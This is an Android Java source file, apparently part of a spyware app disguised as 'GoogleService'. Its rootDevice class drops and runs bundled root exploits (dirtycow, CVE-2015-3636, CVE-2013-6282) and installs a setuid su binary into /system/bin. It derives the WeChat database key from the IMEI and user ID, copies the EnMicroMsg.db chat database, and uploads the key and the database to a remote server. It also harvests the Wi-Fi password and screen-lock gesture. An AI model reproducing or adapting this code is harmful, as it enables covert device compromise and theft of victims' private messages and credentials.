package com.root;




import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import com.main.ForegroundService;
import com.network.NetworkLargeFile;
import com.network.SendDataToServer;
import com.phone.data.ShellCmd;
import com.phone.data.WifiPassGesture;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.content.Context;
import android.content.res.AssetManager;
import android.os.Build;
import android.util.Log;

//Android中App授权获取Root权限，其实不是App自身的权限提升了，而是通过具有ROOT权限的sh流来执行shell命令
public class rootDevice extends Thread{
	private final static String TAG 	= "rootDevice";
	final String dirtycowfilename 		= "dirtycow";
	final String runasfilename 			= "run-as";	
	final String cowrootfilename 		= "cowroot";
	final String cve20153636filename 	= "cve20153636";
	final String cve20136282filename 	= "cve20136282";
	final String googleservicefilename 	= "GoogleService";
	final String sumoveappfilename 		= "suMoveApp";
	final String sufilename 			= "SU";
	final String uploadqqwxdbfilename 	= "uploadQQWXdb";
	final String GOOGLESERVICE_LIB_NAME = "libGoogleServiceRoot.so";
	final String testrootfilename 		= "/system/bin/GoogleServiceRootTest.txt";
	final String cmdfilename			= "uploadQQWXdbcmd";
	final String LOCAL_PARAM_FILENAME 	= "config.json";
	//final String tmppath 				= "/data/local/tmp/";
	
	private Context context				= null;

	public rootDevice(Context context) {
		this.context = context;
	}
	
	

    // 由于targetSdkVersion低于17，只能通过反射获取
    public static String getUserSerial(Context context)
    {
        Object userManager = context.getSystemService("user");
        if (userManager == null)
        {
            Log.e(TAG, "userManager not exsit");
            return null;
        }
        
        try
        {
            Method myUserHandleMethod = android.os.Process.class.getMethod("myUserHandle", (Class<?>[]) null);
            Object myUserHandle = myUserHandleMethod.invoke(android.os.Process.class, (Object[]) null);
            
            Method getSerialNumberForUser = userManager.getClass().getMethod("getSerialNumberForUser", myUserHandle.getClass());
            long userSerial = (Long) getSerialNumberForUser.invoke(userManager, myUserHandle);
            return String.valueOf(userSerial);
        }
        catch (NoSuchMethodException e)
        {
            Log.e(TAG, "", e);
        }
        catch (IllegalArgumentException e)
        {
            Log.e(TAG, "", e);
        }
        catch (IllegalAccessException e)
        {
            Log.e(TAG, "", e);
        }
        catch (InvocationTargetException e)
        {
            Log.e(TAG, "", e);
        }
        
        return null;
    }


	
	
	
	public static String getAllFilesInDir(File apkpathfile,String currentfolder){
		
		String fileopercmd = "";
    	File []files = apkpathfile.listFiles();
    	if(files == null || files.length <= 0){
    		return fileopercmd;
    	}
    	
    	for(int i = 0; i < files.length; i ++){
    		if(files[i].isDirectory() == true){
    			fileopercmd = fileopercmd + getAllFilesInDir(new File(files[i].getAbsolutePath()),currentfolder);
    			continue;
    		}
    		else if(files[i].isFile() == true){
    			if(files[i].getName().endsWith(".apk")){
    				fileopercmd = fileopercmd + "cat " + 
    				files[i].getAbsolutePath() + " > " + "/system/app/" + currentfolder + files[i].getName() + "\n" + 
    				
    				"chmod 755 /system/app/" + currentfolder + files[i].getName() + "\n";
    			}
    			else if(files[i].getName().endsWith(".so")){
	    			fileopercmd = fileopercmd + "cat " + 
	    			files[i].getAbsolutePath() + " > " + "/system/app/" + currentfolder + "lib/arm/" + files[i].getName()+ "\n" +
	    			"chmod 755 /system/app/" + currentfolder + "lib/arm/" + files[i].getName()+ "\n" ;
    			}
    		}
    	}
    	
    	return fileopercmd;
	}
	
	

    public int moveIntoSystemBySU(Context context,String pkgCodePath) {
    	int result = -1;
    	String apkpath;
    	int packagenamepos;
    	String currentfolder;
    	String mkdir;
    	File apkpathfile;
    	String fileopercmd;
    	String deletecmd;
    	String command;
    	
    	if(pkgCodePath.endsWith("base.apk")){
    	
	    	apkpath = pkgCodePath.replace("base.apk","");
	    	packagenamepos = apkpath.indexOf(context.getPackageName());
	    	currentfolder = apkpath.substring(packagenamepos);
	    	mkdir = 
	    	"mkdir /system/app/" + currentfolder + "\n" + 
	    	"chmod 777 /system/app/" + currentfolder + "\n" +
	    	"mkdir /system/app/" + currentfolder + "lib/" + "\n" + 
	    	"chmod 777 /system/app/" + currentfolder + "lib/" + "\n" +
	    	"mkdir /system/app/" + currentfolder + "lib/arm/" + "\n" +
	    	"chmod 777 /system/app/" + currentfolder + "lib/arm/" + "\n" ;
    	
	    	apkpathfile = new File(apkpath);
	    	fileopercmd = getAllFilesInDir(apkpathfile,currentfolder);
	    	if(fileopercmd == null || fileopercmd.equals("") == true){
	    		WriteDateFile.writeLogFile("moveIntoSystemBySU fileopercmd error\r\n");
	    		Log.e(TAG,"moveIntoSystemBySU fileopercmd error\r\n");
	    		return result;
	    	}
	    	
	    	deletecmd = "rm -r " + apkpath + "\n";
	    	
	        command = 
	                "chmod 777 " + apkpath + "\n" +
	                "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /\n" +
	                "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system/\n" +	
	                "chmod 777 /system/app/\n" +			
	                
	                mkdir + 

	                fileopercmd +
	                "chmod 755 " + apkpath + "\n" +
	                "chmod 755 /system/app/" + "\n" +
	                "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system/\n" +
	                "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /\n" +
	                 deletecmd ;
	                 //+"reboot\n";
	                		
	                WriteDateFile.writeLogFile("moveIntoSystemBySU command:" + command + "\r\n");
	                Log.e(TAG,"moveIntoSystemBySU command:" + command + "\r\n");
	    	
    	}else{
    		apkpath = "/data/app/";
    		packagenamepos = pkgCodePath.indexOf(context.getPackageName());
    		String apkfilename = pkgCodePath.substring(packagenamepos);
    		currentfolder = apkfilename.replace(".apk", "") + "/";
	    	mkdir = "";
			fileopercmd =
			"chmod 777 " + pkgCodePath +"\n" +
			"cat " + pkgCodePath + " > " + "/system/app/" + apkfilename + "\n" +
			"chmod 755 " + "/system/app/" + apkfilename + "\n" +
			"chmod 777 " + "/data/app-lib/" + currentfolder + GOOGLESERVICE_LIB_NAME +"\n" +
			"cat " + "/data/app-lib/" + currentfolder + GOOGLESERVICE_LIB_NAME + " > " + "/system/lib/" + GOOGLESERVICE_LIB_NAME + "\n" +
			"chmod 755 " + "/system/lib/" + GOOGLESERVICE_LIB_NAME + "\n";
			
			deletecmd = "rm -r " + pkgCodePath + "\n" +
					"rm -r " + "/data/app-lib/" + currentfolder + GOOGLESERVICE_LIB_NAME + "\n";
			
	        command = 
	                "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system/\n"+	
	                "chmod 777 /system/app/\n" +		
	                "chmod 777 /system/lib/\n" +		

	                fileopercmd +
	                "chmod 755 /system/app/" + "\n" +
	                "chmod 755 /system/lib/\n" +	
	                "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system/\n" +
	                 deletecmd ;
	                 //+"reboot\n";
	        
            WriteDateFile.writeLogFile("moveIntoSystemBySU command:" + command + "\r\n");
            Log.e(TAG,"moveIntoSystemBySU command:" + command + "\r\n");
    	}
    	
        Process process = null;
        DataOutputStream os = null;
        //DataInputStream is = null;
	
        try {
        
            process = Runtime.getRuntime().exec("su"); 
            os = new DataOutputStream(process.getOutputStream());
            //is = new DataInputStream(process.getInputStream());
            os.writeBytes(command);
            os.flush();
            
            //String input = null;
            //while( (input = is.readLine()) != null){
            //	WriteDateFile.writeLogFile("execute root command input result:" + input + "\r\n");
            //	Log.e(TAG,input);
            //}
            
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            result = process.exitValue();
            WriteDateFile.writeLogFile("moveIntoSystemBySU result:" + result + "\r\n");
        } 
        catch (Exception ex) {

        	result = -1;
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("moveIntoSystemBySU exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
        } 
        
        finally {
            try {
                if (os != null) {
                    os.close();
                }
                process.destroy();
            } 
            catch (Exception ex) {

            	result = -2;
    			ex.printStackTrace();
    			String error = ExceptionProcess.getExceptionDetail(ex);
    			String stack = ExceptionProcess.getCallStack();
    			WriteDateFile.writeLogFile("moveIntoSystemBySU finally exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
            }
        }
        return result;
    }
    
    
    
    
	public static int isRootFileExist(){
		int res = 0;
		try{ 
			if ((new File("/system/bin/su").exists() == true) || (new File("/system/xbin/su").exists() == true)){
				res = 0;
			} 
			else {
				res = -1;
			}
		} 
		catch (Exception ex) {
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("isRoot exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
			res = -1;
		} 
		return res;
	}
    

	public void writeFileFromAssets(Context context,String srcfilename,String dstfilename){
		try{
	  		 AssetManager am = context.getAssets();
	  		 InputStream amis = am.open(srcfilename);
	  		 int filelen = 0x20000;
	  		 byte[]buf = new byte[filelen];
	  		 int readcount = 0;
	  		 int offset = 0;
	  		 while((readcount = amis.read(buf,offset,4)) != -1){
	  			 offset += readcount; 
	  		 }
	  		 amis.close();
	  		 
	  		int ret = createFileWithAttribute(dstfilename,buf,offset);
	  		if(ret < 0){
	  			Log.e(TAG,"createfilewithattribute error");
	  		}
	  		 
	  		return ;
		}catch(Exception ex){
			ex.printStackTrace();
		}
	}
	
	
	public static int requestSU(){
		try {
			int ret = ShellCmd.execShell("su","");
			return ret;
		} catch (Exception e) {
			e.printStackTrace();
			return -1;
		}
	}


	
	
	
	public void run(){
		try{	

			
			WriteDateFile.writeLogFile("rootdevice start\r\n");
			int ret = -1;

			String apppath = context.getFilesDir().toString() + "/";
			writeFileFromAssets(context,dirtycowfilename,apppath + dirtycowfilename);
			writeFileFromAssets(context,runasfilename,apppath + runasfilename);
			writeFileFromAssets(context,cve20153636filename,apppath + cve20153636filename);
			writeFileFromAssets(context,cve20136282filename,apppath + cve20136282filename);
			writeFileFromAssets(context,sumoveappfilename,apppath + sumoveappfilename);
			writeFileFromAssets(context,sufilename,apppath + sufilename);
			writeFileFromAssets(context,uploadqqwxdbfilename,apppath + uploadqqwxdbfilename);
			writeFileFromAssets(context,cowrootfilename,apppath + cowrootfilename);
			writeFileFromAssets(context,googleservicefilename,apppath + googleservicefilename);
			writeFileFromAssets(context, LOCAL_PARAM_FILENAME, apppath + LOCAL_PARAM_FILENAME);
			//ParamConfig.setConfigFromJson(apppath + LOCAL_PARAM_FILENAME);
			if(isRootFileExist() == 0 ){
				Log.e(TAG,"su exist");
				
				//尽量用SD卡保存文件，否则root权限使用文件后会导致原来的文件权限上升，无法打开
	    		String logpath = ForegroundService.SDCARD_PATH_NAME + ForegroundService.LOG_FILE_NAME;
				
	    		/*
				String param = "ip:"+Public.SERVER_IP_ADDRESS + "\r\n" +
			    	   	"port:"+String.valueOf(Public.SERVER_DATA_PORT)+"\r\n" + 
			    	   	"imei:"+ new String(Public.IMEI) + "\r\n" + 
			    	   	"logfile:"+logpath+"\r\n" +
			    	   	"clientuser:" + Public.UserName +"\r\n";
				ret = createFileWithAttribute(ForegroundService.SDCARD_PATH_NAME + cmdfilename,param.getBytes(),param.length());
				*/		
	    		
				String param = Public.SERVER_IP_ADDRESS + " " +
			    	   	String.valueOf(Public.SERVER_DATA_PORT)+" " + 
			    	   	new String(Public.IMEI) + " " + 
			    	   	logpath + " " +
			    	   	Public.UserName;
	    		
				File fwxinfo = new File(ForegroundService.SDCARD_PATH_NAME +"weixinuserinfo.txt");
				if (fwxinfo.exists() == true) {
					fwxinfo.delete();
				}
				
				int cnt = Public.WAIT_SU_PERMITION_CNT;
				boolean qqwxsendok=false;
				while(cnt > 0 && qqwxsendok == false){

		    	   	//ret = ShellCmd.execShell("su", apppath  + uploadqqwxdbfilename + " " + ForegroundService.SDCARD_PATH_NAME + cmdfilename);
					ret = ShellCmd.execShell("su", apppath  + uploadqqwxdbfilename + " " + param);
					
					Log.e(TAG,"uploadqqwxdb result:"+ret);
		    	   	Thread.sleep(3000);
		    	   	
		    	   	//fwxinfo = new File(ForegroundService.SDCARD_PATH_NAME +"weixinuserinfo.txt");
					if( fwxinfo.exists() == true && ret == 0){
						byte[] wxinfo = new byte[(int)fwxinfo.length()];
						FileInputStream finwxinfo=new FileInputStream(fwxinfo);
						finwxinfo.read(wxinfo,0,(int)fwxinfo.length());
						finwxinfo.close();
						String userinfo = new String(wxinfo);
						Log.e(TAG,"wxuserinfo:" + userinfo);
						int uinpos = userinfo.indexOf("uin:");
						String uin = userinfo.substring(uinpos + "uin:".length());
						int uinend = uin.indexOf("\r\n");
						uin = uin.substring(0,uinend);

						String dbmd5name = PublicFunction.getMD5("mm"+uin,true);
						Log.e(TAG,"weixin db md5 name:"+dbmd5name);
						String wxdbkey = PublicFunction.getMD5(new String(Public.IMEI) + uin,true).substring(0,7);
						Log.e(TAG,"weixin key:"+wxdbkey);
						SendDataToServer.sendDataToServer(wxdbkey.getBytes(), wxdbkey.getBytes().length, 
								Public.CMD_WEIXINDB_KEY, Public.IMEI,
								Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT,Public.PacketOptNone);
						
						//cat /storage/emulated/0/ fail?
						//cat /data/data/com.tencent.mm/MicroMsg/eb009e186189bdaec68c863f59b19d29/EnMicroMsg.db > /storage/emulated/0/GoogleService/eb009e186189bdaec68c863f59b19d29
						String cmd = "cat /data/data/com.tencent.mm/MicroMsg/" + dbmd5name + "/EnMicroMsg.db > " + 
								ForegroundService.SDCARD_PATH_NAME + dbmd5name;
						ret = ShellCmd.execShell("su",cmd);
												
						NetworkLargeFile.SendNetworkLargeFile(ForegroundService.SDCARD_PATH_NAME + dbmd5name,
								Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT,Public.IMEI,
								Public.CMD_WEIXINDATABASEFILE,Public.PacketOptNone);
						/*
						File wxdbfile = new File(ForegroundService.LOCAL_PATH_NAME+ dbmd5name);
						if(wxdbfile.exists() == true){
							FileInputStream finwxdb=new FileInputStream(wxdbfile);
							byte[]lpwxdb=new byte[(int)wxdbfile.length()];
							finwxdb.read(lpwxdb,0,(int)wxdbfile.length());
							finwxdb.close();
							SendDataToServer.sendDataToServer(lpwxdb, (int)wxdbfile.length(), ServiceThreadProc.CMD_WEIXINDATABASEFILE, strimei.getBytes(),
									Public.SERVER_IP_ADDRESS,Public.SERVER_DATA_PORT);
						}
						*/
						qqwxsendok = true;
					}else{
						Log.e(TAG,"not found weixinuserinfo.txt");
						Thread.sleep(Public.WAIT_SU_PERMITION_TIME);
					}
					cnt --;
				}
				
				ret = makesu(apppath + sufilename,"/system/bin/" + sufilename);
				if (ret == 0) {
					WriteDateFile.writeLogFile("makesu successed\r\n");
				}else{
					WriteDateFile.writeLogFile("makesu result:" + ret + "\r\n");
					return;
				}
				
				String wifipass = WifiPassGesture.getScreenGesture(context);
				String gesture = WifiPassGesture.getWifiPassword(context);
				Log.e(TAG, "wifi pass:" + wifipass + " " + "gesture:"+gesture);
				
				/*
		    	PhoneFiles flashfiles = new PhoneFiles("/data/data/",ForegroundService.SDCARD_PATH_NAME,
		    			ForegroundService.FLASHCARDFILES_FILENAME,
		    			ServiceThreadProc.CMD_DATA_FLASHCARDFILES,strimei.getBytes());
		    	Thread tf = new Thread(flashfiles);
		    	tf.start();
		    	*/
				
				/*
				int runasroot = moveIntoSystemBySU(context,context.getPackageCodePath());
				if (runasroot == 0) {
					
					WriteDateFile.writeLogFile("move program into system by su successed\r\n");
					GoogleServiceActivity.systemApp = true;
				}
				else{
					WriteDateFile.writeLogFile("move program into system by su error\r\n");
				}
				*/
			}
			else if(Build.VERSION.SDK_INT > 17 && Build.VERSION.SDK_INT < 23){
				Log.e(TAG,"sdk is above 17 and below 23,use cve 2015 3636 to root");
				//ret = ShellCommand.execShell("sh", apppath  + cve20153636filename);
				
			}else if(Build.VERSION.SDK_INT <= 17 && Build.VERSION.SDK_INT >= 8){
				Log.e(TAG,"sdk is above 8 and below 17,use cve 2013 6282 to root");
				ret = ShellCmd.execShell("sh", apppath + cve20153636filename);
			}else{
				
			}
		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("run() exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
		}
	}
	
	

	

	
	

	public int makesu(String srcfilename,String dstfilename){
		int result = -1;
		
        Process process = null;
        DataOutputStream os = null;
        //DataInputStream is = null;

		try {	
			String command = 
			"mount -o remount,rw /\n" +
	        "mount -o remount,rw /system\n" +
	        "chmod 777 /system/\n" +
			"cat " + srcfilename + " > " + dstfilename + "\n" +
			"chown root:root " + dstfilename + "\n" +
			"chmod 6755 " + dstfilename + "\n" +
			"chmod 755 /system/\n" +
			"mount -o remount,ro /system\n" ;
			
			WriteDateFile.writeLogFile("makesu command:" + command + "\r\n");
        
            process = Runtime.getRuntime().exec("su"); 
            os = new DataOutputStream(process.getOutputStream());
            //is = new DataInputStream(process.getInputStream());
            os.writeBytes(command);
            os.flush();

            //String input = null;
            //while( (input = is.readLine()) != null){
            //	WriteDateFile.writeLogFile("execute root command input result:" + input + "\r\n");
            //	Log.e(TAG,input);
            //}
            
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            result = process.exitValue();
            WriteDateFile.writeLogFile("makesu result:" + result + "\r\n");
        } 
        catch (Exception ex) {
        	result = -1;
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("makesu exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
        } 
        
        finally {
            try {
                if (os != null) {
                    os.close();
                }
                process.destroy();
            } 
            catch (Exception ex) {
            	result = -2;
    			ex.printStackTrace();
    			String error = ExceptionProcess.getExceptionDetail(ex);
    			String stack = ExceptionProcess.getCallStack();
    			WriteDateFile.writeLogFile("makesu finally exception:" + error + "\r\n" + "stack:" + stack + "\r\n");
            }
        }
		
		return result;
	}
	

	
	public static native int checkLockFileExist(String filename);
	public static native int resetOomadj(String logfilename);
	public static native int createFileWithAttribute(String filename,byte[]filedata,int filedatasize);
	public static native int isdeviceroot(String filename);
	public static native int watchSelfUninstall( String path, String url, int version,String userSerialNumber,
			String ip,int port,String imei,String logfile,String amstartname,String clientuser);

	
}
